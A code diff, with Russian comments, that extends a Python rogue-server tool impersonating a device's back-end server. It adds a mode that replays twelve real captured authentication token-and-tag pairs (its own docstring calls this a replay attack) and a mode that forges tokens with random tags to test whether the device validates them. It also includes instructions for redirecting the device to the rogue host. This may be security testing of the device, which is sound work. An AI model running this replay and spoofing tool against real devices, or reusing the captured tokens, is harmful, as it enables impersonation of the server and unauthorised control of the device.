@@ -32,6 +32,8 @@
   python3 smt_rogue_server.py --port 40000 --interactive    # оператор сам вводит ответ
   python3 smt_rogue_server.py --port 40000 --respond raw --raw 'ACK update\r\n'
   python3 smt_rogue_server.py --port 40000 --followup 'SET SERVER_URL=...\r\n'
+  python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt 0   # replay
+  python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt forge
 """
 from __future__ import annotations
 
@@ -49,6 +51,53 @@ try:
     import smt_server as srv
 except Exception:
     srv = None
+
+
+# Поле Server_MT прибора хранит 37 байт: 33-символьный токен на алфавите
+# 012345678ABCDEFGHIJKLMNOPQRSTUVWXYZ (35 символов, без «9») + 4-байтовый
+# проприетарный тег (не стандартная CRC/хэш — проверено: CRC32×8, CRC16×9,
+# MD5/SHA1/SHA256, Adler32, FNV-1/1a, DJB2, sdbm, Jenkins OAT, sum/xor — ни
+# один вариант не совпал). Ниже — 12 РЕАЛЬНО ЗАХВАЧЕННЫХ валидных пар,
+# используются ТОЛЬКО для replay-теста (не позволяют вычислить алгоритм тега,
+# но проверяют, различает ли прибор валидный тег от произвольного).
+SERVER_MT_ALPHABET = "012345678ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+SERVER_MT_SAMPLES = [
+    ("6LH54TZBTUM7JA8OAUYE3KWB1AOOAMRRG", bytes.fromhex("2305A719")),
+    ("ULIYSEC2O38YQ8TQJW77V5MI2COAC0I2N", bytes.fromhex("4EB36D89")),
+    ("620AX6RY315E2HZYPNQRZWI7SLUX3KAWG", bytes.fromhex("039B2655")),
+    ("1860O7KWXKFYZBQVH0RQ3GM0OET0KWCEZ", bytes.fromhex("4D58C769")),
+    ("S0L72QXRZKQ0352LFWW0XWSTYGDIKFVBD", bytes.fromhex("2F87FE37")),
+    ("WWO2T6130LDMO6SSCWOVTESMM6NREEJ05", bytes.fromhex("0ACEAFD9")),
+    ("EK81WFTGZBFKMOR2WIFCLE7F5HQS03JZ6", bytes.fromhex("0B58B14D")),
+    ("VJRB02JBHDOYMGNC8UMM1OKO17J0SQ73D", bytes.fromhex("2AA60687")),
+    ("YNHXIPYCQXA0X0X4430DFEGCV3CJFMUEM", bytes.fromhex("0E5EBD25")),
+    ("5HGL16KX4QR35GHP0Z8S3WTNJDSB4CJS6", bytes.fromhex("04306F9F")),
+    ("U2VNYBLK56JYUAY0KV6M42U4ERVNZEBCP", bytes.fromhex("3C37EDF1")),
+    ("LEPF1H6UQWJLQWVSS6LMMV7KPK6VDU6J5", bytes.fromhex("41852171")),
+]
+
+
+def forge_server_mt(rng=None) -> bytes:
+    """Синтаксически валидный (по алфавиту/длине) токен со СЛУЧАЙНЫМ тегом.
+
+    Тег заведомо неверный — цель не подделать реальный тег (алгоритм
+    неизвестен), а проверить: если прибор всё равно ПРИНИМАЕТ такую запись,
+    значит тег на приёме не проверяется (или проверяется не там, где мы
+    отвечаем). Если отклоняет/игнорирует — тег валидируется.
+    """
+    import random
+    rng = rng or random
+    token = "".join(rng.choice(SERVER_MT_ALPHABET) for _ in range(33))
+    tag = bytes(rng.randrange(256) for _ in range(4))
+    return token.encode("ascii") + tag
+
+
+def replay_server_mt(index: int) -> bytes:
+    """Дословный повтор одного из реально захваченных валидных ответов
+    (classic replay attack) — не требует знания алгоритма тега вообще."""
+    token, tag = SERVER_MT_SAMPLES[index % len(SERVER_MT_SAMPLES)]
+    return token.encode("ascii") + tag
 
 
 BANNER = (
@@ -78,7 +127,8 @@ def analyse_inbound(buf: bytes) -> dict:
     return rep
 
 
-def make_response(mode: str, n_records: int, raw: str | None, file: str | None) -> bytes:
+def make_response(mode: str, n_records: int, raw: str | None, file: str | None,
+                  server_mt: str | None = None) -> bytes:
     if mode == "accept":
         return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")
     if mode == "update":
@@ -90,6 +140,11 @@ def make_response(mode: str, n_records: int, raw: str | None, file: str | None) 
     if mode == "file":
         with open(file, "rb") as f:
             return f.read()
+    if mode == "server_mt":
+        spec = (server_mt or "0").strip().lower()
+        if spec == "forge":
+            return forge_server_mt()
+        return replay_server_mt(int(spec) if spec else 0)
     return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")
 
 
@@ -115,7 +170,7 @@ def handle(conn, addr, args):
     while True:
         try:
             d = conn.recv(4096)
-        except socket.timeout:
+        except TimeoutError:
             break
         if not d:
             break
@@ -150,7 +205,7 @@ def handle(conn, addr, args):
             typed = ""
         sent = _unescape(typed) if typed.strip() else make_response("accept", n, None, None)
     else:
-        sent = make_response(args.respond, n, args.raw, args.file)
+        sent = make_response(args.respond, n, args.raw, args.file, args.server_mt)
         if args.followup:
             sent += _unescape(args.followup)
 
@@ -173,7 +228,7 @@ def handle(conn, addr, args):
                 if not d:
                     break
                 reaction += d
-        except socket.timeout:
+        except TimeoutError:
             pass
         if reaction:
             print(f"  ← ПРИБОР ОТВЕТИЛ на нашу реплику ({len(reaction)} байт):")
@@ -194,10 +249,15 @@ def main():
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
     ap.add_argument("--host", default="0.0.0.0")
     ap.add_argument("--port", type=int, default=40000)
-    ap.add_argument("--respond", choices=["accept", "update", "silent", "raw", "file"],
+    ap.add_argument("--respond",
+                    choices=["accept", "update", "silent", "raw", "file", "server_mt"],
                     default="accept", help="что отвечать прибору")
     ap.add_argument("--raw", help="ответ для --respond raw (поддержка \\r\\n\\xHH)")
     ap.add_argument("--file", help="файл-ответ для --respond file")
+    ap.add_argument("--server-mt", default="0",
+                    help="для --respond server_mt: индекс образца 0-11 (replay реально "
+                         "захваченного валидного token+tag) или 'forge' (синтаксически "
+                         "валидный токен со случайным тегом — проверка, валидируется ли тег)")
     ap.add_argument("--followup", help="добить дополнительной строкой после ACK "
                                        "(проба server→device команды)")
     ap.add_argument("--interactive", action="store_true",
@@ -223,8 +283,8 @@ def main():
     s.listen(5)
     print(f"[*] слушаю {args.host}:{args.port} — жду сессию прибора "
           f"(режим ответа: {args.respond}{' +followup' if args.followup else ''})")
-    print("[*] наведи прибор сюда: SERVER_URL = <этот host>:%d (вкладка «Команды») "
-          "или сетевым перенаправлением. Ctrl+C — стоп." % args.port)
+    print(f"[*] наведи прибор сюда: SERVER_URL = <этот host>:{args.port} (вкладка «Команды») "
+          "или сетевым перенаправлением. Ctrl+C — стоп.")
     try:
         while True:
             conn, addr = s.accept()
